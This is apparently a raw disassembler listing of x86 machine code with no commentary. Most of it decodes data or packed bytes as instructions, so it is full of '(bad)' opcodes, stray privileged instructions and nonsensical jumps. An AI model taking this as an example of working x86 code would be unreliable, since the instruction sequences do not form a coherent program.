  4332e8:	add    DWORD PTR [ebx],eax
  4332ea:	add    BYTE PTR [eax+0x4d],dl
  4332ed:	jne    0x433322
  4332ef:	lea    ecx,[ebx-0x7617fc44]
  4332f5:	div    ah
  4332f7:	inc    DWORD PTR [ebp+0x45]
  4332fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433300:	jb     0x43328d
  433302:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433309:	mov    ecx,DWORD PTR [ebp-0x10]
  43330c:	xor    ecx,DWORD PTR [ebp+0x3]
  43330f:	mov    edi,DWORD PTR [ebx]
  433311:	adc    BYTE PTR [ebp+0x41],dh
  433314:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
